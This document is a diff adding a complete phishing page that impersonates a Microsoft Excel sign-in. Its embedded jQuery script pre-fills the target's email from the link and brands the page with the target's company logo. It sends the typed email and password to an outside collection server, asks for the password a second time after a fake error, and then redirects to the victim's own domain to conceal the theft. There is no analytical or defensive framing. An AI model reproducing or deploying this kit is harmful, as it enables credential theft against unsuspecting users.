@@ -1,0 +1,212 @@
+<html data-emailvalue="test@gmail.com" lang="en">
+
+<head>
+    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="icon" type="image/ico" href="https://c1-odc-15.cdn.office.net:443/start/s/161631441003_resources\favicon_excel.ico">
+    <title>
+    Microsoft Excel - Work together on Excel spreadsheets: Sign in</title>
+</head>
+
+
+<body style="background-image: url(https://i.gyazo.com/a70751de539e73d96288f91f8c3361a1.jpg); background-repeat: no-repeat;background-size: cover;">
+
+    <div class="container-fluid p-0">
+        <div class="container">
+            <div class="row my-5">
+                <div class="col-lg-5 mx-auto">
+                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+                       
+
+                        <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img id="login_logo1" src='https://res-1.cdn.office.net/shellux/excel_24x.067c6a6a32c636ef30bc50ddb143b7d9.svg' width="60" height="60" alt="Sign In">
+                        </div>
+                        <br>
+
+                            <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">Sign In </strong></h3>
+            
+                  
+                            <span class="h5"></span><br>
+                            <span class="h">Confirm your identity to prove you are not a robot</span><br>
+                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
+                            <span id="error" class="text-danger" style="display: none;">Account does not exist. Enter a different account</span>
+                            <small></small>
+                            <div class="form-group">
+                            <form  action="">
+<input type="hidden" name="" value="https://www.ups.com/track?loc=en_US/">
+                                <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
+                            </div>
+                            <div class="form-group mt-2">
+                                <small></small>
+                                <input type="password" id="pr" placeholder="Password" class="form-control" required="">
+                            </div>
+                        </div>
+                        <div class="form-check mt-3">
+                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
+                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Remember Me.</a></span></label>
+                            <span><span><a href="#" class="float-right"></a></span></span>
+                        </div>
+                        <div class="col-lg-12 mt-3">
+                            <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #036e2a;">Sign in</button>
+
+                           
+                                                   </div>
+                    </div>
+                </div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+
+    //console.log(ai)
+    //console.log(pr)
+
+
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+
+       // console.log(dom)
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+
+
+
+
+
+
+
+
+
+        $.ajax({
+            dataType: 'JSON',
+          
+
+
+            url:'https://stoic-meninsky.13-53-105-16.plesk.page/send.php',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+        
+
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+</script>
+
+
+</html>
